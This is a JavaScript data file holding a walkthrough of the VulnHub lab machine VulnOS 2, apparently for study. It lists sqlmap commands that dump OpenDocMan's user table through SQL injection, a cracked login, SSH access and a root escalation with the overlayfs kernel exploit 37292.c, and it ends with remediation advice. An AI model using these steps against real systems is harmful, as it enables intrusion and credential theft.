export const vulnhubWalkthroughs = [
  {
    id: 'vulnos-2',
    machineName: 'VulnOS 2',
    difficulty: 'Beginner to Intermediate',
    os: 'Linux (Ubuntu)',
    source: 'https://www.vulnhub.com/entry/vulnos-2,147/',
    goal: 'Gain root access and capture the final flag',
    summary: 'A boot2root machine running Drupal 7 and OpenDocMan v1.2.7. Exploit SQL injection to dump credentials, SSH in as webmin, then escalate to root via the overlayfs kernel exploit.',
    tools: ['netdiscover', 'nmap', 'whatweb', 'wafw00f', 'dirsearch', 'sqlmap', 'ssh', 'gcc'],
    phases: [
      {
        title: 'Phase 1: Reconnaissance',
        steps: [
          { text: 'Find the target IP using netdiscover' },
          { text: 'Run nmap for ports and services', command: 'nmap -sV -sC 192.168.0.178' },
          { text: 'Identify the CMS with whatweb', command: 'whatweb http://192.168.0.178/jabc/' },
          { text: 'Check for WAF', command: 'wafw00f http://192.168.0.178/jabc/' },
          { text: 'Directory brute force', command: 'dirsearch -u http://192.168.0.178/jabc/' },
        ],
      },
      {
        title: 'Phase 2: Web Enumeration',
        steps: [
          { text: 'Browse the site and search for "guest" in source code' },
          { text: 'Found login page: /jabcd0cs/' },
          { text: 'Login with guest/guest' },
          { text: 'Identified OpenDocMan v1.2.7' },
        ],
      },
      {
        title: 'Phase 3: Exploitation (SQL Injection)',
        steps: [
          { text: 'Test SQL injection on ajax_udf.php', command: 'http://192.168.0.178/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' },
          { text: 'List databases with SQLMap', command: 'sqlmap -u "http://192.168.0.178/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --flush-session --crawl=1 --level=5 --risk=3 -v 1 --dbs --batch' },
          { text: 'List tables in jabcd0cs database', command: 'sqlmap -u "http://192.168.0.178/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --flush-session --crawl=1 --level=5 --risk=3 -v 1 -D jabcd0cs --tables --batch' },
          { text: 'Dump the odm_user table', command: 'sqlmap -u "http://192.168.0.178/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --flush-session --crawl=1 --level=5 --risk=3 -v 1 -D jabcd0cs -T odm_user --dump --batch' },
          { text: 'Crack the MD5 hash', command: 'https://md5.gromweb.com/?md5=b78aae356709f8c31118ea613980954b' },
        ],
      },
      {
        title: 'Phase 4: SSH Access',
        steps: [
          { text: 'Connect via SSH', command: 'ssh webmin@192.168.0.178' },
          { text: 'Password: webmin1980' },
          { text: 'Get a proper shell', command: '/bin/bash' },
          { text: 'Verify identity', command: 'whoami' },
        ],
      },
      {
        title: 'Phase 5: Privilege Escalation',
        steps: [
          { text: 'Check kernel version', command: 'uname -r' },
          { text: 'Kernel: 3.13.0-24-generic' },
          { text: 'Search for exploit: 37292.c (overlayfs)' },
          { text: 'Go to /tmp (writable location)', command: 'cd /tmp' },
          { text: 'Create exploit.c and paste the C code' },
          { text: 'Compile', command: 'gcc exploit.c -o exploit' },
          { text: 'Make executable', command: 'chmod +x exploit' },
          { text: 'Run exploit', command: './exploit' },
          { text: 'Get root shell', command: '/bin/bash' },
        ],
      },
      {
        title: 'Phase 6: Capture the Flag',
        steps: [
          { text: 'Navigate to root directory', command: 'cd /root' },
          { text: 'Read the flag', command: 'cat flag.txt' },
        ],
      },
    ],
    keyFindings: [
      'Drupal 7 on Apache 2.4.7',
      'OpenDocMan v1.2.7 SQL injection',
      'Webmin credentials: webmin1980',
      'Kernel 3.13.0-24-generic vulnerable to overlayfs',
    ],
    flag: 'Hello and welcome. You successfully compromised the company "JABC" and the server completely !! Congratulations !!! Hope you enjoyed it.',
    remediation: 'Update all software. Patch SQL injection. Keep kernel up to date. Never use default credentials.',
    notes: 'Use /tmp for exploit files (permission denied elsewhere). The target IP was 192.168.0.178 in my lab setup. Both VMs on Bridged Adapter for Windows browser access.',
  },
]